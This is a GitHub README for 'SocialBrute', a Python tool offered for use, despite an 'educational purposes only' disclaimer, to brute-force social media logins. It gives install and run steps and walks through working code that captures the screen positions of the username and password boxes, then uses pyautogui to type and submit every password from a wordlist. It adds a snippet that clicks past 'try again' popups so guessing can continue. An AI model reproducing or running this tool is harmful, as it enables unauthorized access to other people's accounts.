<h1 align="center">SocialBrute</h1>
<p align="center">This is a bruteforce attacker made in Python. Any misuse is beyond my responsibility this is for educational purposes only</p>

##### NOTE: YOU CAN ALTER THE CODE FOR OTHER SITES AS IT MAY COME UP WITH A POPUP EVERYTIME ITS WRONG BUT I WILL ADD THSES FEATURES IN NEWER VERSIONS

<p align="center">
  <img src="BANNER.png">
</p>

## Requirements
----

- Python 3.9+
- getpass
- date 
- colorama
- sys
- time
- keyboard
- pyautogui 
- os
- requests 
- webbrowser
- time
- string
- random

---- 

## Usage
----

```
git clone https://github.com/unofficialdxnny/socialbrute

```

``` 
cd socialbrute

```

```
pip install requirements.txt

```

```
python main.py

```


<p align="center">
  <img src="disclaimer.png">
</p>



## Code Explanation



This is the banner
```py

print("""
                  
                  
         
            /££££££                      /££           /££ /£££££££                        /££              
           /££__  ££                    |__/          | ££| ££__  ££                      | ££              
          | ££  \__/  /££££££   /£££££££ /££  /££££££ | ££| ££  \ ££  /££££££  /££   /££ /££££££    /££££££ 
          |  ££££££  /££__  ££ /££_____/| ££ |____  ££| ££| £££££££  /££__  ££| ££  | ££|_  ££_/   /££__  ££
           \____  ££| ££  \ ££| ££      | ££  /£££££££| ££| ££__  ££| ££  \__/| ££  | ££  | ££    | ££££££££
           /££  \ ££| ££  | ££| ££      | ££ /££__  ££| ££| ££  \ ££| ££      | ££  | ££  | ££ /££| ££_____/
          |  ££££££/|  ££££££/|  £££££££| ££|  £££££££| ££| £££££££/| ££      |  ££££££/  |  ££££/|  £££££££
           \______/  \______/  \_______/|__/ \_______/|__/|_______/ |__/       \______/    \___/   \_______/
                                                                                                  
                                                                   Author: unofficialdxnny
                                                                       Version: 1.0.0                               
                                                                                                  
""")

```


The modules that are imported and wil be used
```py

import getpass
from datetime import date 
from colorama import Fore, Back, Style
import sys
from time import sleep
import keyboard
import pyautogui as pag
import os
import requests 
import webbrowser
import time
import string
import random

```



 Gets system time
```py

today = date.today()

## date format
d2 = today.strftime("%B %d, %Y")

print(d2)

```



Typewriter effect
```py

def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type('Program launched successfully today @ ')
```

Records than prints the username box coordinates
```py

if keyboard.read_key() == "enter":
  usernamebar = pag.position()
  print(f"Cords captured: {usernamebar}")
  time.sleep(2)

  ```

Records coordinates for password box
```py

if keyboard.read_key() == "enter":
  passwordbar = pag.position()
  print(f"Cords captured: {passwordbar}")
  time.sleep(5)
```

Goes to the username box
```py

pag.moveTo(usernamebar[0], usernamebar[1], 0.5)
pag.click()
time.sleep(2)




keyboard.write(username)
```
Goes to password box
```py

pag.moveTo(passwordbar[0], passwordbar[1], 0.5)
pag.click()
time.sleep(2)
```

Types in passwords from list
```py
def startPasting():
  time.sleep(5) # time before starting the paste sequence
  text = open('passwords.txt')
  for each_line in text:
    time.sleep(2)
    pag.press("ctrl + a")
    time.sleep(2)
    pag.press("backspace")
    pag.typewrite(each_line)
    time.sleep(2)
    pag.press("enter")
  text.close()
startPasting()
```

Incase you get a popup everytime you type in a incorrect code add this snippet below the code where it records coordinates for password

<p align="center">
  <img src="https://imgur.com/csUacUd.png">
</p>

```py
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type("Press Enter when your mouse is over the tryagain button \n")




if keyboard.read_key() == "enter":
  tryagain = pag.position()
  print(f"Cords captured: {tryagain}")
  time.sleep(5)
```

Than below the `pag.press(enter)` paste this
```py
pag.moveTo(tryagain[0], tryagain[1], 0.5)
pag.click()
```
